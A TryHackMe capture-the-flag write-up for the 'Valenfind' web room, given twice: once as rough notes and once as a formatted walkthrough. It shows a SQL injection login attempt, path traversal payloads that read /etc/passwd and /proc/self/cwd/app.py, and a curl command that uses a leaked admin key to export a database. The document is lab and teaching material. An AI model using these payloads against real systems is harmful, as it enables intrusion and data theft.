# Valenfind
[🔗 View Challenge][https://tryhackme.com/room/lafb2026e10]
* Navigate to http://MACHINE_IP:5000 using a web browser. This is a login page.
* Attempt to use ' OR 1=1 -- as username (SQL injection) to bypass login didn't work.
* There was an option to create an account. I have just created an account and logged into it.
* There were several user profiles visible after logging in. I observed that the URL is http://MACHINE_IP:5000/profile/user_name, tried to access admin using URL manipulation which didn't work out.
* Checking all the profiles cupid had a large no : of likes and is also related to the theme of the CTF.
* Cupid's description says "I keep the database secure. No peeking.". Enough to say it can be a suspect.
* Viewing the source code of Cupid's profile shows an api endpoint in the javascript.
* Navigate to http://MACINE_IP:5000/api/fetch_layout?layout=../../../../etc/passwd to check if this endpoint is vulnerable.
* The above URL showed list of users confirming that this is an endpoint.
* Now trying some other source files to find the flag. I tried:
  * ../../../../app.py
  * ../../../../main.py
  * ../../../../application.py
  * ../../../../run.py
  * ../../../../.env
none of them worked.
* Navigate to http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../proc/self/cwd/app.py. The path /proc/self/cwd means /proc - system/process info, /proc/self - current running process, /proc/self/cwd - current working directory.
* This was accessible and I got an admin_API_key and a database.
* Send custom headers using curl, curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" http://IP:5000/api/admin/export_db -o leak.db
* leak.db is saved now.
* Read it using sqlite3 leak.db, list all the tables using .tables,a tables named users is found, now display the users table using SELECT * FROM users.
* Flag is found in the description of cupid.


# Valenfind | TryHackMe Writeup

🔗 [View Challenge](https://tryhackme.com/room/lafb2026e10)

---

## 🎯 Objective
Gain access to sensitive data and retrieve the flag.

---

## 🔍 Enumeration

Navigated to the web application at `http://MACHINE_IP:5000`, which presented a login page.

Tried a basic SQL injection payload:

```sql
' OR 1=1 --
```

However, this did not bypass authentication.

Since there was an option to create an account, I registered a new user and logged in successfully.

---

## 🔎 Analysis

After logging in, multiple user profiles were visible.  
The URL structure was:

```bash
http://MACHINE_IP:5000/profile/username
```

Tried accessing the admin profile via URL manipulation, but it was not accessible.

While exploring profiles, the user **cupid** stood out due to:
- unusually high number of likes  
- thematic relevance to the challenge  
- suspicious description:  
  > "I keep the database secure. No peeking."

This suggested that cupid might be linked to backend functionality.

---

## ⚔️ Exploitation

Viewing the page source of cupid’s profile revealed a JavaScript API endpoint:

```bash
/api/fetch_layout?layout=
```

Tested for path traversal vulnerability:

```bash
http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../etc/passwd
```

This successfully returned system user data, confirming a **Path Traversal vulnerability**.

---

### 🔁 Further Exploration

Tried accessing common files:

```bash
../../../../app.py
../../../../main.py
../../../../application.py
../../../../run.py
../../../../.env
```

These attempts did not return useful data.

Then accessed:

```bash
http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../proc/self/cwd/app.py
```

This worked and revealed:
- `admin_API_key`
- database-related information

---

## 🔐 Database Extraction

Used the API key to export the database:

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" http://MACHINE_IP:5000/api/admin/export_db -o leak.db
```

---

## 🗄️ Database Analysis

Opened the database:

```bash
sqlite3 leak.db
```

Listed tables
```sql
.tables
```

Found a table named `users`.

Retrieved its contents:

```sql
SELECT * FROM users;
```

---

## 🏁 Flag

The flag was found in the description field of the **cupid** user.

---

## 🧠 Key Learnings

- Path Traversal can expose sensitive system files  
- `/proc/self/cwd` can be used to access application files  
- API endpoints in JavaScript can reveal hidden functionality  
- Proper input validation is critical to prevent such vulnerabilities  
